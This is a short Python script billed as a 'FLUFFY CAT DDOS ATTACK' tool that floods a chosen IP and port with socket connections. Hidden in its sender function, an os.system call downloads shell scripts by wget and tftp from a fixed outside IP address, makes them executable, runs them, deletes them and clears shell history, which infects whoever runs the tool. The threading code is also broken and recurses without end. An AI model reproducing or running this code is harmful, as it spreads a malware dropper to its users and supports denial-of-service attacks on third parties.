import os
import socket
import threading
import time
input("Welcome to FLUFFY CAT DDOS ATTACK")
ip = input("Enter the ip to ddos: ")
port = int(input("Enter a port: "))
threads = int(input("Enter threads: "))

def sender():
  sock = socket.socket()
  sock.connect((ip, port))
  os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.105.180.88/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 172.105.180.88 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c")
  sock.sendall(b"SYN=0")
  sock.close()
  sender()

q = []
for i in range(threads):
  t = threading.Thread(target=sender())
  t.daemon = True
  q.append(t)
for i in range(threads):
  q[i].start()
for i in range(threads): 
  q[i].join()
